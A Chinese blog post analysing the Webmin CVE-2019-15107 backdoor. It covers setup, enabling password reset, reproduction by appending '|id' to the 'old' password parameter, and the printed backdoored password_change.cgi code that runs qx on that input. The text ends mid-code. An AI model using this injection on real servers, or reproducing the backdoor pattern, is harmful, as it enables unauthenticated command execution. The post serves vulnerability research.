<!DOCTYPE HTML>
<html lang="en">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="CVE-2019-15107 Webmin RCE 后门深入分析, Qftm">
    <meta name="description" content="Maybe a hacker">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>CVE-2019-15107 Webmin RCE 后门深入分析 | Qftm</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Qftm</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>Index</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>Tags</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>Categories</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>Archives</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-heartbeat" style="zoom: 0.6;"></i>
      
      <span>About</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>Friends</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Qftm</div>
        <div class="logo-desc">
            
            Maybe a hacker
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			Index
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			Tags
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			Categories
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			Archives
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-heartbeat"></i>
			
			About
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			Friends
		</a>
          
        </li>
        
        
    </ul>
</div>


        </div>

        
    </nav>

</header>

    
<script src="/libs/cryptojs/crypto-js.min.js"></script>
<script>
    (function() {
        let pwd = '';
        if (pwd && pwd.length > 0) {
            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                alert('密码错误，将返回主页！');
                location.href = '/';
            }
        }
    })();
</script>




<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/banner/bg.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">CVE-2019-15107 Webmin RCE 后门深入分析</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        margin: 35px 0 15px 0;
        padding-left: 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        height: calc(100vh - 250px);
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/Webmin/">
                                <span class="chip bg-color">Webmin</span>
                            </a>
                        
                            <a href="/tags/Perl/">
                                <span class="chip bg-color">Perl</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
                                代码审计
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
                    2020-10-25
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
                    2020-10-20
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
                    5.5k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
                    26 Min
                </div>
                

                
            </div>
        </div>
        <hr class="clearfix">
        <div class="card-content article-card-content">
            <div id="articleContent">
                <p>最近，有关<code>webmin CVE-2019-15107</code>，看了网上几篇分析文章，发现有些文章并没有把该有的细节讲清楚，比如：chybeta师傅分析的文章中root用户可以直接利用攻击，这里并没有说明白：如果系统用户（root等）被加入到webmin中作为特殊webmin用户，认证方式为Unix authenticaton，则使用user=被webmin添加的系统用户、old=任意字符|系统命令，此时系统命令是无法执行的【因为old根本进不去恶意代码存在的if逻辑中】。正因如此才有了下文，文中如有不当之处还忘各位师傅指出。</p>
<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p>Webmin是基于Web的Unix系统管理工具。管理员通过浏览器访问Webmin的各种管理(用户、网络、文件等)功能并完成相应的管理动作。</p>
<p>2019年8月10日，Pentest上发布了<a href="https://www.pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html" target="_blank" rel="noopener">Webmin CVE-2019-15107</a>未授权远程代码执行漏洞。当用户开启Webmin密码重置【使用过期的密码提示用户输入新密码】功能后，攻击者可以通过向<code>password_change.cgi</code>功能页面发送特定的POST请求在目标系统中执行任意命令，并且无需身份验证即未授权RCE。</p>
<p>影响版本：1.890 &lt;= Webmin &lt;= 1.920</p>
<h1 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h1><h2 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h2><pre><code>webmin：1.920
OS：Linux 5.4.0-kali3-amd64 x86_64</code></pre><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>针对webmin特定版本的安装，官方指明了两种常规方法：一种通过系统软件包管理器安装、另一种通过脚本手动配置安装。这两种方法推荐第二种方法，第一种很容出现依赖问题，解决起来很麻烦！！！</p>
<p>下面以安装特定版本<code>webmin：1.920</code>来描述两种安装手法</p>
<ul>
<li><strong>第一种</strong></li>
</ul>
<p>环境</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 系统</span>
Debian OS

<span class="token comment" spellcheck="true"># 包管理器</span>
dpkg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>官网下载相应的<code>deb</code>包</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 手动</span>
https://sourceforge.net/projects/webadmin/files/webmin/

<span class="token comment" spellcheck="true"># 自动</span>
<span class="token function">wget</span> http://prdownloads.sourceforge.net/webadmin/webmin_1.920_all.deb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>安装</p>
<pre class="line-numbers language-bash"><code class="language-bash">$ dpkg --install webmin_1.920_all.deb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>一般情况下，这个安装过程会出现缺失依赖的情况</p>
<pre class="line-numbers language-bash"><code class="language-bash">$ dpkg --install webmin_1.920_all.deb
Selecting previously unselected package webmin.
<span class="token punctuation">(</span>Reading database <span class="token punctuation">..</span>. 261755 files and directories currently installed.<span class="token punctuation">)</span>
Preparing to unpack webmin_1.920_all.deb <span class="token punctuation">..</span>.
Unpacking webmin <span class="token punctuation">(</span>1.920<span class="token punctuation">)</span> <span class="token punctuation">..</span>.
dpkg: dependency problems prevent configuration of webmin:
 webmin depends on libauthen-pam-perl<span class="token punctuation">;</span> however:
  Package libauthen-pam-perl is not installed.
 webmin depends on libio-pty-perl<span class="token punctuation">;</span> however:
  Package libio-pty-perl is not installed.
 webmin depends on apt-show-versions<span class="token punctuation">;</span> however:
  Package apt-show-versions is not installed.

dpkg: error processing package webmin <span class="token punctuation">(</span>--install<span class="token punctuation">)</span>:
 dependency problems - leaving unconfigured
Processing triggers <span class="token keyword">for</span> systemd <span class="token punctuation">(</span>244-3<span class="token punctuation">)</span> <span class="token punctuation">..</span>.
Errors were encountered <span class="token keyword">while</span> processing:
 webmin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>根据提示安装依赖</p>
<pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">apt-get</span> <span class="token function">install</span> libauthen-pam-perl libio-pty-perl apt-show-versions<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>事实上这个解决依赖的过程中也会出现版本依赖问题导致依赖安装失败，如果你想折腾就慢慢解决它们之间的依赖问题！！！！</p>
<ul>
<li><strong>第二种</strong></li>
</ul>
<p>环境</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 系统</span>
Debian OS

<span class="token comment" spellcheck="true"># 工具</span>
shell、perl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>官网下载相应压缩包</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 手动</span>
https://sourceforge.net/projects/webadmin/files/webmin/

<span class="token comment" spellcheck="true"># 自动</span>
<span class="token function">wget</span> http://prdownloads.sourceforge.net/webadmin/webmin-1.920.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>解压</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tar</span> -xvf webmin-1.920.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>创建特定目录：为webmin定制特定目录</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 安装路径</span>
<span class="token function">mkdir</span> -p /usr/local/share/webmin/webmin-1.920 

<span class="token comment" spellcheck="true"># 配置路径</span>
<span class="token function">mkdir</span> -p /etc/webmin/webmin-1.920

<span class="token comment" spellcheck="true"># 日志路径</span>
<span class="token function">mkdir</span> -p /var/webmin/webmin-1.920


<span class="token function">mkdir</span> -p /usr/local/share/webmin/webmin-1.920 /etc/webmin/webmin-1.920 /var/webmin/webmin-1.920<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>安装：进入解压后的<code>webmin-1.920</code>目录，使用安装脚本<code>setup.sh</code>进行特定目录的安装及配置</p>
<pre class="line-numbers language-bash"><code class="language-bash">$ ./setup.sh /usr/local/share/webmin/webmin-1.920/
***********************************************************************
*            Welcome to the Webmin setup script, version 1.920        *
***********************************************************************
Webmin is a web-based interface that allows Unix-like operating
systems and common Unix services to be easily administered.

Installing Webmin from /mnt/hgfs/QSec/Pentest/Code-Audit/Source-Code/Webmin/sourceforge/webmin-1.920/webmin to /usr/local/share/webmin/webmin-1.920/ <span class="token punctuation">..</span>.

***********************************************************************
Webmin uses separate directories <span class="token keyword">for</span> configuration files and log files.
Unless you want to run multiple versions of Webmin at the same <span class="token function">time</span>
you can just accept the defaults.

Config <span class="token function">file</span> directory <span class="token punctuation">[</span>/etc/webmin<span class="token punctuation">]</span>: /etc/webmin/webmin-1.920
Log <span class="token function">file</span> directory <span class="token punctuation">[</span>/var/webmin<span class="token punctuation">]</span>: /var/webmin/webmin-1.920

***********************************************************************
Webmin is written entirely <span class="token keyword">in</span> Perl. Please enter the full path to the
Perl 5 interpreter on your system.

Full path to perl <span class="token punctuation">(</span>default /usr/bin/perl<span class="token punctuation">)</span>: 

Testing Perl <span class="token punctuation">..</span>.
Perl seems to be installed ok

***********************************************************************
Operating system name:    Ubuntu Linux
Operating system version: 18.04.1

***********************************************************************
Webmin uses its own password protected web server to provide access
to the administration programs. The setup script needs to know <span class="token keyword">:</span>
 - What port to run the web server on. There must not be another
   web server already using this port.
 - The login name required to access the web server.
 - The password required to access the web server.
 - If the webserver should use SSL <span class="token punctuation">(</span>if your system supports it<span class="token punctuation">)</span>.
 - Whether to start webmin at boot time.

Web server port <span class="token punctuation">(</span>default 10000<span class="token punctuation">)</span>: 10000
Login name <span class="token punctuation">(</span>default admin<span class="token punctuation">)</span>: admin
Login password: 
Password again: 
The Perl SSLeay library is not installed. SSL not available.
Webmin does not support being started at boot <span class="token function">time</span> on your system.
***********************************************************************
Copying files to /usr/local/share/webmin/webmin-1.920/ <span class="token punctuation">..</span>
<span class="token punctuation">..</span>done

Creating web server config files<span class="token punctuation">..</span>
<span class="token punctuation">..</span>done

Creating access control file<span class="token punctuation">..</span>
<span class="token punctuation">..</span>done

Inserting path to perl into scripts<span class="token punctuation">..</span>
<span class="token punctuation">..</span>done

Creating start and stop scripts<span class="token punctuation">..</span>
<span class="token punctuation">..</span>done

Copying config files<span class="token punctuation">..</span>
<span class="token punctuation">..</span>done

Creating uninstall script /etc/webmin/webmin-1.920/uninstall.sh <span class="token punctuation">..</span>
<span class="token punctuation">..</span>done

Changing ownership and permissions <span class="token punctuation">..</span>
<span class="token punctuation">..</span>done

Running postinstall scripts <span class="token punctuation">..</span>
<span class="token punctuation">..</span>done

Enabling background status collection <span class="token punctuation">..</span>
<span class="token punctuation">..</span>done

Attempting to start Webmin mini web server<span class="token punctuation">..</span>
Starting Webmin server <span class="token keyword">in</span> /usr/local/share/webmin/webmin-1.920/
<span class="token punctuation">..</span>done

***********************************************************************
Webmin has been installed and started successfully. Use your web
browser to go to

  http://rose:10000/

and login with the name and password you entered previously.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>使用这种方法安装之后访问webmin服务：正常安装启动、不存在依赖问题</p>
<p><img src="/2020/10/25/CVE-2019-15107-Webmin-RCE-Backdoor/image-20201019211526525.png" alt="image-20201019211526525"></p>
<p>如何手动启动webmin服务：指定相应的<code>miniserv.pl</code>和<code>miniserv.conf</code>文件</p>
<pre class="line-numbers language-bash"><code class="language-bash">$ /usr/bin/perl /usr/local/share/webmin/webmin-1.920/miniserv.pl /etc/webmin/webmin-1.920/miniserv.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="密码重置"><a href="#密码重置" class="headerlink" title="密码重置"></a>密码重置</h2><p>在webmin中对过期密码策略的管理方式有三种：始终拒绝密码过期的用户【默认】、始终允许用户使用过期的密码、使用过期的密码提示用户输入新密码。</p>
<p>这里为了复现分析漏洞，开启第三种策略：密码重置功能【未授权即可访问重置Webmin账户密码-》提供原账户、原密码、新密码即可】；</p>
<p>依次点击<code>Webmin-&gt; Webmin Configuration-&gt; Authentication</code>进行配置</p>
<p><img src="/2020/10/25/CVE-2019-15107-Webmin-RCE-Backdoor/image-20201020102949719.png" alt="image-20201020102949719"></p>
<p>配置保存重启之后查看配置文件：<code>miniserv.conf</code>，其中有关密码过期策略<code>passwd_mode=2</code>已生效，其值取值为<code>0、1、2</code>分别代表上述三种策略。</p>
<p><img src="/2020/10/25/CVE-2019-15107-Webmin-RCE-Backdoor/image-20201020103201978.png" alt="image-20201020103201978"></p>
<p>配置生效之后直接访问可能出现<code>warning</code></p>
<p><img src="/2020/10/25/CVE-2019-15107-Webmin-RCE-Backdoor/image-20201020104432490.png" alt="image-20201020104432490"></p>
<p>根据提示添加<code>Referer</code>头或修改相应配置项即可</p>
<ul>
<li>Referer头</li>
</ul>
<p><img src="/2020/10/25/CVE-2019-15107-Webmin-RCE-Backdoor/image-20201020212330079.png" alt="image-20201020212330079"></p>
<ul>
<li>配置项</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">root@165df4a40dfa:<span class="token comment" spellcheck="true"># sed -i 's/referers_none=1/referers_none=0/g' /etc/webmin/webmin-1.920/config</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p><code>password_change.cgi</code>具有密码重置功能，通过POST请求抓包，对<code>old</code>参数进行修改加上<code>|id</code>，即可执行系统命令<code>id</code>并回显。</p>
<p><img src="/2020/10/25/CVE-2019-15107-Webmin-RCE-Backdoor/image-20201020144615173.png" alt="image-20201020144615173"></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在上述POC验证中，核心参数的含义为：</p>
<pre class="line-numbers language-txt"><code class="language-txt">user   webmin原账户
old    webmin原密码
new1   webmin新密码
new2   webmin新密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>刚看到这个漏洞很是疑惑，为什么漏洞点会出现在<code>old</code>参数，其仅仅代表原密码，怎么会被RCE！！！带着这个疑惑开始了下文对webmin项目源码的审计分析。</p>
<p>通过漏洞点<code>old</code>参数进行逆向追踪分析，核心文件当然是<code>password_change.cgi</code>，其位于项目根目录下</p>
<pre class="line-numbers language-perl"><code class="language-perl"><span class="token comment" spellcheck="true">#!/usr/local/bin/perl</span>
<span class="token comment" spellcheck="true"># password_change.cgi</span>
<span class="token comment" spellcheck="true"># Actually update a user's password by directly modifying /etc/shadow</span>

BEGIN <span class="token punctuation">{</span> push<span class="token punctuation">(</span><span class="token variable">@INC</span><span class="token punctuation">,</span> <span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> WebminCore<span class="token punctuation">;</span>

<span class="token variable">$ENV</span><span class="token punctuation">{</span><span class="token string">'MINISERV_INTERNAL'</span><span class="token punctuation">}</span> <span class="token operator">||</span> <span class="token keyword">die</span> <span class="token string">"Can only be called by miniserv.pl"</span><span class="token punctuation">;</span>
<span class="token variable">&amp;init_config</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">&amp;ReadParse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">&amp;get_miniserv_config</span><span class="token punctuation">(</span><span class="token operator">\</span><span class="token variable">%miniserv</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$miniserv</span><span class="token punctuation">{</span><span class="token string">'passwd_mode'</span><span class="token punctuation">}</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">||</span> <span class="token keyword">die</span> <span class="token string">"Password changing is not enabled!"</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true"># Validate inputs</span>
<span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'new1'</span><span class="token punctuation">}</span> <span class="token operator">ne</span> <span class="token string">''</span> <span class="token operator">||</span> <span class="token variable">&amp;pass_error</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">{</span><span class="token string">'password_enew1'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'new1'</span><span class="token punctuation">}</span> <span class="token operator">eq</span> <span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'new2'</span><span class="token punctuation">}</span> <span class="token operator">||</span> <span class="token variable">&amp;pass_error</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">{</span><span class="token string">'password_enew2'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true"># Is this a Webmin user?</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">&amp;foreign_check</span><span class="token punctuation">(</span><span class="token string">"acl"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">&amp;foreign_require</span><span class="token punctuation">(</span><span class="token string">"acl"</span><span class="token punctuation">,</span> <span class="token string">"acl-lib.pl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token variable">$wuser</span><span class="token punctuation">)</span> <span class="token operator">=</span> grep <span class="token punctuation">{</span> <span class="token variable">$_</span><span class="token operator">-></span><span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">}</span> <span class="token operator">eq</span> <span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'user'</span><span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token variable">&amp;acl::list_users</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$wuser</span><span class="token operator">-></span><span class="token punctuation">{</span><span class="token string">'pass'</span><span class="token punctuation">}</span> <span class="token operator">eq</span> <span class="token string">'x'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment" spellcheck="true"># A Webmin user, but using Unix authentication</span>
        <span class="token variable">$wuser</span> <span class="token operator">=</span> <span class="token keyword">undef</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token keyword">elsif</span> <span class="token punctuation">(</span><span class="token variable">$wuser</span><span class="token operator">-></span><span class="token punctuation">{</span><span class="token string">'pass'</span><span class="token punctuation">}</span> <span class="token operator">eq</span> <span class="token string">'*LK*'</span> <span class="token operator">||</span>
           <span class="token variable">$wuser</span><span class="token operator">-></span><span class="token punctuation">{</span><span class="token string">'pass'</span><span class="token punctuation">}</span> <span class="token operator">=~</span> <span class="token regex">/^\!/</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">&amp;pass_error</span><span class="token punctuation">(</span><span class="token string">"Webmin users with locked accounts cannot change "</span><span class="token operator">.</span>
                       <span class="token string">"their passwords!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'pam'</span><span class="token punctuation">}</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token variable">$wuser</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$miniserv</span><span class="token punctuation">{</span><span class="token string">'passwd_cindex'</span><span class="token punctuation">}</span> <span class="token operator">ne</span> <span class="token string">''</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$miniserv</span><span class="token punctuation">{</span><span class="token string">'passwd_mindex'</span><span class="token punctuation">}</span> <span class="token operator">ne</span> <span class="token string">''</span> <span class="token operator">||</span> 
        <span class="token keyword">die</span> <span class="token string">"Missing password file configuration"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$wuser</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true"># Update Webmin user's password</span>
    <span class="token variable">$enc</span> <span class="token operator">=</span> <span class="token variable">&amp;acl::encrypt_password</span><span class="token punctuation">(</span><span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'old'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token variable">$wuser</span><span class="token operator">-></span><span class="token punctuation">{</span><span class="token string">'pass'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$enc</span> <span class="token operator">eq</span> <span class="token variable">$wuser</span><span class="token operator">-></span><span class="token punctuation">{</span><span class="token string">'pass'</span><span class="token punctuation">}</span> <span class="token operator">||</span> <span class="token variable">&amp;pass_error</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">{</span><span class="token string">'password_eold'</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token string">qx/$in{'old'}/</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$perr</span> <span class="token operator">=</span> <span class="token variable">&amp;acl::check_password_restrictions</span><span class="token punctuation">(</span><span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'user'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'new1'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$perr</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">&amp;pass_error</span><span class="token punctuation">(</span><span class="token variable">&amp;text</span><span class="token punctuation">(</span><span class="token string">'password_enewpass'</span><span class="token punctuation">,</span> <span class="token variable">$perr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$wuser</span><span class="token operator">-></span><span class="token punctuation">{</span><span class="token string">'pass'</span><span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token variable">&amp;acl::encrypt_password</span><span class="token punctuation">(</span><span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'new1'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$wuser</span><span class="token operator">-></span><span class="token punctuation">{</span><span class="token string">'temppass'</span><span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
